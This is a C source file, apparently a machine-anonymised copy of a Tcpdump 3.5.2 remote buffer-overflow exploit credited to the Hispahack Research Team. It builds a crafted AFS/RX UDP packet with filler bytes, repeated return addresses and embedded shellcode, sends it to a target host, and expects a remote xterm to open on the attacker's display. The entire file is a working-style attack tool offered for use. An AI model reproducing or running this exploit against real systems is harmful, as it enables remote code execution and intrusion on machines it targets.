
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {void* sin_port; TYPE_1__ sin_addr; void* sin_family; } ;
struct sockaddr {int dummy; } ;
struct rx_header {int flags; void* seq; int type; } ;
typedef int sin ;
typedef int buffer ;
typedef int addr ;


 long VAR_0 ;
 int VAR_1 ;
 void* VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 char VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 int VAR_11 ;
 int VAR_12 ;
 int FUNC_0 (char*) ;
 scalar_t__ FUNC_1 (int,struct sockaddr*,int) ;
 int FUNC_2 (int) ;
 int FUNC_3 (int) ;
 int FUNC_4 (int ,char*,...) ;
 void* FUNC_5 (int) ;
 void* FUNC_6 (int ) ;
 int FUNC_7 (char*,char*,scalar_t__) ;
 int FUNC_8 (char*,char,int) ;
 int FUNC_9 (char*) ;
 int FUNC_10 (char*,char*) ;
 int FUNC_11 (char*) ;
 int FUNC_12 (int,char*,int,int ,struct sockaddr_in*,int) ;
 char* VAR_13 ;
 int FUNC_13 (void*,int ,int ) ;
 int FUNC_14 (char*,char*) ;
 int VAR_14 ;
 scalar_t__ FUNC_15 (char*) ;

int FUNC_16 (int VAR_15, char *VAR_16[]) {

 struct sockaddr_in VAR_17,VAR_18;
 int VAR_19,VAR_20, VAR_21=VAR_9;
 char VAR_22[4048], *VAR_23;
 struct rx_header *VAR_24;
 long int *VAR_25, VAR_26=VAR_0;


  FUNC_4(VAR_14,"\n!Hispahack Research Team (http://hispahack.ccc.de)\n");
  FUNC_4(VAR_14,"Tcpdump 3.5.2 xploit by Zhodiac <zhodiac@softhome.net>\n\n");


  if (VAR_15<3) {
    FUNC_10("Usage: %s <host> <display> [offset]\n",VAR_16[0]);
    FUNC_3(-1);
    }

  if (VAR_15==4) VAR_21=FUNC_0(VAR_16[3]);
  VAR_26+=VAR_21;

  FUNC_4(VAR_14,"Using return addr: %#lx\n",VAR_26);

  VAR_17.sin_family=VAR_2;
  VAR_17.sin_addr.s_addr=FUNC_11(VAR_16[1]);
  VAR_17.sin_port=FUNC_6(VAR_3);

  if ((VAR_19=FUNC_13(VAR_2, VAR_12,0))<0) {
     FUNC_9("socket()");
     FUNC_3(-1);
     }

  VAR_18.sin_family=VAR_2;
  VAR_18.sin_addr.s_addr=VAR_5;
  VAR_18.sin_port=FUNC_6(VAR_4);

  if (FUNC_1(VAR_19,(struct sockaddr*)&VAR_18,sizeof(VAR_18))<0) {
      FUNC_9("bind()");
      FUNC_3(-1);
      }

  FUNC_8(VAR_22,0,sizeof(VAR_22));
  VAR_24=(struct rx_header *)VAR_22;

  VAR_24->type=VAR_11;
  VAR_24->seq=FUNC_5(1);
  VAR_24->flags=VAR_10;

  VAR_25=(long int *)(VAR_22+sizeof(struct rx_header));
  *(VAR_25++)=FUNC_5(VAR_1);
  *(VAR_25++)=FUNC_5(1);
  *(VAR_25++)=FUNC_5(2);
  *(VAR_25++)=FUNC_5(3);

  *(VAR_25++)=FUNC_5(420);
  VAR_23=(char *)VAR_25;
  FUNC_14(VAR_23,"1 0\n");
  VAR_23+=4;

  FUNC_8(VAR_23,'A',120);
  VAR_23+=120;
  VAR_25=(long int *)VAR_23;
  for (VAR_20=0;VAR_20<VAR_7;VAR_20++) *(VAR_25++)=VAR_26;
  VAR_23=(char *)VAR_25;
  FUNC_8(VAR_23,VAR_6,VAR_8);
  VAR_23+=VAR_8;
  VAR_13[30]=(char)(46+FUNC_15(VAR_16[2]));
  FUNC_7(VAR_23,VAR_13,FUNC_15(VAR_13));
  VAR_23+=FUNC_15(VAR_13);
  FUNC_7(VAR_23,VAR_16[2],FUNC_15(VAR_16[2]));
  VAR_23+=FUNC_15(VAR_16[2]);

  FUNC_14(VAR_23," 1\n");

  if (FUNC_12(VAR_19,VAR_22,520,0,&VAR_17,sizeof(VAR_17))==-1) {
     FUNC_9("send()");
     FUNC_3(-1);
     }

  FUNC_4(VAR_14,"Packet with Overflow sent, now wait for the xterm!!!! :)\n\n");

  FUNC_2(VAR_19);
  return(0);
 }
